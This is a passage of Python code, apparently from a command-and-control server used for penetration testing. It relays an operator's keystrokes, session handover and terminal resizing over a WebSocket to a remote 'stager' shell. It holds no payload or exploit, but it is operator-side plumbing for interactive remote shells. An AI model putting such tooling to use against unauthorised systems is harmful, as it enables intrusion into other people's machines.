                    data = base64.b64decode(msg.get("data", ""))
                    await tasking.send_input(sess, data)
                elif t == "wheel":
                    sess.take_wheel(tester)
                elif t == "resize" and sess.pty:
                    # propagate the terminal size to the stager's PTY (vim/nano/less work)
                    rows = int(msg.get("rows", 0) or 0)
                    cols = int(msg.get("cols", 0) or 0)
                    if rows and cols:
                        await sess.send(b"\x1bW%d,%d\n" % (rows, cols))
        except WebSocketDisconnect:
            pass
        finally:
            out_task.cancel()
            sess.unsubscribe(q)
            sess.detach(tester)
